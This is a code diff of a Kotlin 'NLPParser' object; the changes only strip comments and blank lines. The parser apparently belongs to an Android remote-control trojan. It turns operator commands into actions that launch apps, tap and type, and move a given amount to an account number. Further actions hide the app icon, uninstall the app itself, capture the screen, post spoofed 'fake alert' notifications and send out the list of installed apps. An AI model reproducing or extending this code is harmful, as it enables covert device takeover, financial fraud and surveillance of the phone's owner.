@@ -7,41 +7,26 @@ object NLPParser {
         val actions = mutableListOf<Action>()
         val lower = input.lowercase().replace(Regex("[^a-z0-9 .]"), "")
 
-        // Extract package: "open com.whatsapp", "launch messages"
         val pkg = extractPackageName(lower) ?: guessAppFromIntent(lower)
-
-        // Phone: "call +1234567890"
         val phone = Regex("""(?:call|dial|phone|number)[\s:]+([+]?[0-9]{8,15})""").find(lower)?.groupValues?.get(1)
-
-        // Amount: "send $100"
         val amount = Regex("""(?:send|transfer|pay)\s*[$€£]?\s*([\d,]+(?:\.\d{2})?)""").find(lower)?.groupValues?.get(1)?.replace(",", "")
-
-        // Account: "to 123456789"
         val account = Regex("""(?:to|account|acc)\s*[:\s]+(\d{6,12})""").find(lower)?.groupValues?.get(1)
-
-        // Text: "type 'Hello'"
         val text = Regex("""(?:type|enter|write)[\s"']+(.+?)(?:["']|$)""").find(lower)?.groupValues?.get(1)
 
-        // Tap: "tap at 500,1000"
         val coord = Regex("""tap\s+at\s+(\d+),\s*(\d+)""").find(lower)
         val x = coord?.groupValues?.get(1)?.toIntOrNull()
         val y = coord?.groupValues?.get(2)?.toIntOrNull()
 
-        // Swipe: "swipe from 500,1500 to 500,500"
         val swipe = Regex("""swipe\s+from\s+(\d+),\s*(\d+)\s+to\s+(\d+),\s*(\d+)""").find(lower)
         val (sx, sy, ex, ey) = if (swipe != null) listOf(1, 2, 3, 4).map { swipe.groupValues[it].toIntOrNull() ?: 0 } else listOf(0, 0, 0, 0)
 
-        // Wait: "wait 3 seconds"
         val waitSec = Regex("""wait(?: for)? (\d+) ?(?:seconds?|secs?|s)""").find(lower)?.groupValues?.get(1)?.toIntOrNull()
-
-        // Click: "click send"
         val clickText = Regex("""click(?: on)?(?: the)?(?: button|text)?(?: called|named)?(?: "([^"]+)")?""").find(lower)?.groupValues?.get(1)
 
         val goBack = lower.contains("go back") || lower.contains("press back")
         val goHome = lower.contains("go home") || lower.contains("home screen")
 
         // === BUILD ACTIONS ===
-
         if (pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))
         if (waitSec != null) actions.add(Action("wait", waitSec * 1000, "Wait ${waitSec}s"))
 
@@ -74,22 +59,18 @@ object NLPParser {
 
         if (lower.contains("hide app")) actions.add(Action("hide_activity", null, "Hide Icon"))
         if (lower.contains("uninstall")) actions.add(Action("uninstall", null, "Uninstall Self"))
-
         if (lower.contains("start screen")) actions.add(Action("start_screen_capture", null, "Start Screen Capture"))
         if (lower.contains("stop screen")) actions.add(Action("stop_screen_capture", null, "Stop Screen Capture"))
-
         if (lower.contains("send notification") || lower.contains("fake alert")) {
             val title = extractQuotedText(lower, "title") ?: "⚠ Alert"
             val body = extractQuotedText(lower, "body") ?: "Tap to view"
             actions.add(Action("fake_notification", mapOf("title" to title, "text" to body), "Send Spoofed Notification"))
         }
-
         if (lower.contains("list apps") || lower.contains("get apps")) {
             actions.add(Action("get_apps", null, "Send Installed Apps"))
         }
 
         if (actions.isEmpty()) actions.add(Action("unknown", null, "No valid command"))
-
         return actions
     }
 
